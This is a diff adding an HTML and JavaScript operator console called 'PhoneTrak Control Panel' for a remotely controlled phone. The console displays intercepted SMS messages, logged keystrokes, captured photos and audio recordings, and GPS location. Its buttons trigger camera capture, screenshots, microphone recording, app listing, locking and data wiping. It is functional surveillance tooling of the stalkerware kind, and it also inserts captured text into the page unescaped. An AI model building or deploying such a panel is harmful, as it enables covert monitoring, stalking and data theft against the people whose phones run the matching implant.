@@ -1,0 +1,174 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>PhoneTrak Control Panel</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { background: #0a0a0a; color: #fff; font-family: monospace; }
+        .header { background: #111; padding: 15px; border-bottom: 2px solid #4CAF50; }
+        .header h1 { color: #4CAF50; font-size: 20px; }
+        .container { display: flex; height: calc(100vh - 60px); }
+        .sidebar { width: 300px; background: #111; padding: 15px; overflow-y: auto; }
+        .main { flex: 1; padding: 15px; overflow-y: auto; }
+        .card { background: #1a1a1a; border: 1px solid #333; padding: 15px; margin-bottom: 15px; border-radius: 8px; }
+        .card h3 { color: #4CAF50; margin-bottom: 10px; }
+        .btn { background: #4CAF50; color: #fff; border: none; padding: 8px 15px; margin: 3px; cursor: pointer; border-radius: 4px; font-size: 12px; }
+        .btn:hover { background: #388E3C; }
+        .btn.danger { background: #f44336; }
+        .btn.danger:hover { background: #c62828; }
+        .btn.blue { background: #2196F3; }
+        .data-row { padding: 5px 0; border-bottom: 1px solid #222; font-size: 13px; }
+        .data-row .time { color: #888; }
+        .data-row .content { color: #ccc; }
+        .log { background: #000; padding: 10px; max-height: 400px; overflow-y: auto; font-size: 12px; }
+        .log .entry { padding: 4px 0; border-bottom: 1px solid #111; }
+        .log .sms { color: #64B5F6; }
+        .log .keystroke { color: #FFB74D; }
+        .log .photo { color: #81C784; }
+        .log .command { color: #E57373; }
+        input, select { background: #222; color: #fff; border: 1px solid #444; padding: 8px; margin: 5px 0; width: 100%; border-radius: 4px; }
+        .live-indicator { display: inline-block; width: 10px; height: 10px; border-radius: 50%; margin-right: 5px; }
+        .live { background: #4CAF50; }
+        .dead { background: #f44336; }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <h1>🔍 PhoneTrak Control Panel</h1>
+    </div>
+    <div class="container">
+        <div class="sidebar">
+            <div class="card">
+                <h3>Device Status</h3>
+                <div id="deviceStatus">
+                    <span class="live-indicator dead"></span> No device connected
+                </div>
+            </div>
+            <div class="card">
+                <h3>Quick Commands</h3>
+                <button class="btn" onclick="sendCmd('ring')">🔔 Ring</button>
+                <button class="btn" onclick="sendCmd('camera_front')">📸 Front Camera</button>
+                <button class="btn" onclick="sendCmd('camera_back')">📸 Back Camera</button>
+                <button class="btn" onclick="sendCmd('screenshot')">📱 Screenshot</button>
+                <button class="btn" onclick="sendCmd('audio_record')">🎤 Record Audio</button>
+                <button class="btn" onclick="sendCmd('gps')">📍 Get GPS</button>
+                <button class="btn" onclick="sendCmd('app_list')">📋 App List</button>
+                <button class="btn danger" onclick="sendCmd('lock')">🔒 Lock</button>
+                <button class="btn danger" onclick="sendCmd('wipe_data')">🗑️ Wipe</button>
+            </div>
+            <div class="card">
+                <h3>Audio Settings</h3>
+                <input type="number" id="audioDuration" value="30" placeholder="Duration (seconds)">
+                <button class="btn blue" onclick="sendCmd('audio_record', {duration: document.getElementById('audioDuration').value})">
+                    Start Recording
+                </button>
+            </div>
+        </div>
+        <div class="main">
+            <div class="card">
+                <h3>📊 Live Data Feed</h3>
+                <div class="log" id="dataFeed">
+                    <div class="entry">Waiting for data...</div>
+                </div>
+            </div>
+            <div class="card">
+                <h3>📷 Latest Photo</h3>
+                <div id="photoViewer">
+                    <p style="color:#888">No photos captured yet</p>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        let deviceId = '';
+        let wsUrl = 'ws://' + window.location.hostname + ':8765';
+        
+        // Connect to WebSocket server for live data
+        function connectLiveData() {
+            // Poll the HTTP API for now since we can't connect WS from browser to same port easily
+            setInterval(refreshData, 3000);
+        }
+        
+        function refreshData() {
+            fetch('/ws/data?device_id=' + deviceId)
+                .then(r => r.json())
+                .then(data => {
+                    if (data.data && data.data.length > 0) {
+                        updateFeed(data.data);
+                    }
+                });
+            
+            fetch('/ws/devices')
+                .then(r => r.json())
+                .then(data => {
+                    if (data.devices && data.devices.length > 0) {
+                        const device = data.devices[0];
+                        deviceId = device.device_id;
+                        document.getElementById('deviceStatus').innerHTML = 
+                            '<span class="live-indicator live"></span> ' +
+                            device.device_id.substring(0, 8) + '... | ' +
+                            '🔋' + (device.battery || '?') + '% | ' +
+                            '📍' + (device.location || 'Unknown');
+                        
+                        if (device.location) {
+                            document.getElementById('deviceStatus').querySelector('.live-indicator').className = 'live-indicator live';
+                        }
+                    }
+                });
+        }
+        
+        function updateFeed(data) {
+            const feed = document.getElementById('dataFeed');
+            let html = '';
+            data.reverse().forEach(item => {
+                const time = item.timestamp ? item.timestamp.substring(11, 19) : '';
+                const typeClass = item.type || '';
+                let content = '';
+                
+                if (item.type === 'sms') {
+                    content = '💬 SMS: ' + (item.data.sender || '') + ' - ' + (item.data.body || '');
+                } else if (item.type === 'keystroke') {
+                    content = '⌨️ Key: [' + (item.data.app || '') + '] ' + (item.data.text || '');
+                } else if (item.type === 'photo') {
+                    content = '📸 Photo captured!';
+                    // Show photo
+                    if (item.data.photo) {
+                        document.getElementById('photoViewer').innerHTML = 
+                            '<img src="data:image/jpeg;base64,' + item.data.photo + '" style="max-width:100%;border-radius:8px;">';
+                    }
+                } else if (item.type === 'audio') {
+                    content = '🎤 Audio recorded (' + (item.data.duration || '?') + 's)';
+                } else if (item.type === 'command_result') {
+                    content = '✅ Command result: ' + JSON.stringify(item.data);
+                } else {
+                    content = JSON.stringify(item);
+                }
+                
+                html += '<div class="entry ' + typeClass + '"><span class="time">' + time + '</span> ' + content + '</div>';
+            });
+            feed.innerHTML = html || '<div class="entry">No data yet</div>';
+        }
+        
+        function sendCmd(cmd, extra = {}) {
+            fetch('/ws/command', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                    device_id: deviceId,
+                    command: {type: cmd, ...extra}
+                })
+            })
+            .then(r => r.json())
+            .then(data => {
+                const feed = document.getElementById('dataFeed');
+                feed.innerHTML = '<div class="entry command">📤 Command sent: ' + cmd + ' (' + (data.sent ? 'sent' : 'queued') + ')</div>' + feed.innerHTML;
+            });
+        }
+        
+        // Start
+        connectLiveData();
+        refreshData();
+    </script>
+</body>
+</html>
